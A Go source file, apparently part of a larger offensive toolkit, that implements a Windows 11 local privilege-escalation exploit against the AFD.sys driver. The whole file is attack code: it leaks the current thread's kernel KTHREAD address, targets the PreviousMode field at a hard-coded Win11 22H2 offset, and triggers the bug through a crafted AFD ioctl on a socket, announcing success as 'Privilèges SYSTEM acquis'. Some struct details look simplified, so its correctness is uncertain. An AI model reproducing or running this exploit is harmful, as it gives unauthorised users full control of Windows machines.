//go:build windows

package main

import (
	"fmt"
	"os"
	"os/user"
	"syscall"
	"unsafe"
)

const (
	SystemExtendedHandleInformation = 0x40
	STATUS_INFO_LENGTH_MISMATCH     = 0xC0000004
	IOCTL_AFD_NOTIFY_SOCKADDR       = 0x12127
)

type SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX struct {
	Object                uintptr
	UniqueProcessId       uintptr
	HandleValue           uintptr
	GrantedAccess         uint32
	CreatorBackTraceIndex uint16
	ObjectTypeIndex       uint16
	HandleAttributes      uint32
	Reserved              uint32
}

type SYSTEM_HANDLE_INFORMATION_EX struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	Handles         [1]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
}

type AFD_NOTIFY_SOCKADDR struct {
	CompletionPort syscall.Handle
	Context        uintptr
	Reserved       uintptr
	BufferLength   uint32
	Unknown        uint32
	Padding        uint32
	Address        [16]byte
}

var (
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ws2_32   = syscall.NewLazyDLL("ws2_32.dll")

	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
	procWSASocket                = ws2_32.NewProc("WSASocketW")
)

// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel
func GetCurrentThreadKThreadAddress() (uintptr, error) {
	var returnLength uint32
	pid, _, _ := procGetCurrentProcessId.Call()
	tid, _, _ := procGetCurrentThreadId.Call()

	// 1. Taille buffer
	procNtQuerySystemInformation.Call(
		uintptr(SystemExtendedHandleInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// 2. Appel
	buffer := make([]byte, returnLength+1024)
	ret, _, _ := procNtQuerySystemInformation.Call(
		uintptr(SystemExtendedHandleInformation),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret != 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation fail: 0x%x", ret)
	}

	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
	handles := (*[1 << 20]SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(&info.Handles[0]))

	for i := uintptr(0); i < info.NumberOfHandles; i++ {
		handle := handles[i]
		if handle.UniqueProcessId == pid && handle.HandleValue == tid {
			return handle.Object, nil
		}
	}

	return 0, fmt.Errorf("thread not found")
}

// ExploitAFDSys réalise l'élévation de privilèges
func ExploitAFDSys() bool {
	fmt.Println("[*] Lancement de l'exploit AFD.sys (Windows 11 LPE)...")

	// 1. Leak noyau
	kThreadAddr, err := GetCurrentThreadKThreadAddress()
	if err != nil {
		fmt.Printf("[!] Erreur Leak: %v\n", err)
		return false
	}
	fmt.Printf("[+] KTHREAD leaked at: 0x%x\n", kThreadAddr)

	// 2. Cible (PreviousMode) - Offset pour Win11 22H2
	targetAddr := kThreadAddr + 0x232

	// 3. Socket Trigger
	handle, _, _ := procWSASocket.Call(
		syscall.AF_INET,
		syscall.SOCK_STREAM,
		syscall.IPPROTO_TCP,
		0, 0, 0,
	)
	if handle == uintptr(syscall.InvalidHandle) {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	var dummy uint32
	input := AFD_NOTIFY_SOCKADDR{
		Context:      targetAddr,
		BufferLength: 1,
	}

	// 4. Trigger IOCTL
	procDeviceIoControl.Call(
		handle,
		uintptr(IOCTL_AFD_NOTIFY_SOCKADDR),
		uintptr(unsafe.Pointer(&input)),
		uintptr(unsafe.Sizeof(input)),
		0, 0,
		uintptr(unsafe.Pointer(&dummy)),
		0,
	)

	return CheckAdmin()
}

// CheckAdmin vérifie si on est Admin / SYSTEM
func CheckAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

func main() {
	u, _ := user.Current()
	fmt.Printf("[*] Module PrivEsc - Target: %s\n", u.Username)

	if CheckAdmin() {
		fmt.Println("[+] Déjà Administrateur.")
		return
	}

	if ExploitAFDSys() {
		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM acquis.")
	} else {
		fmt.Println("[-] ÉCHEC : L'élévation n'a pas fonctionné.")
	}
}
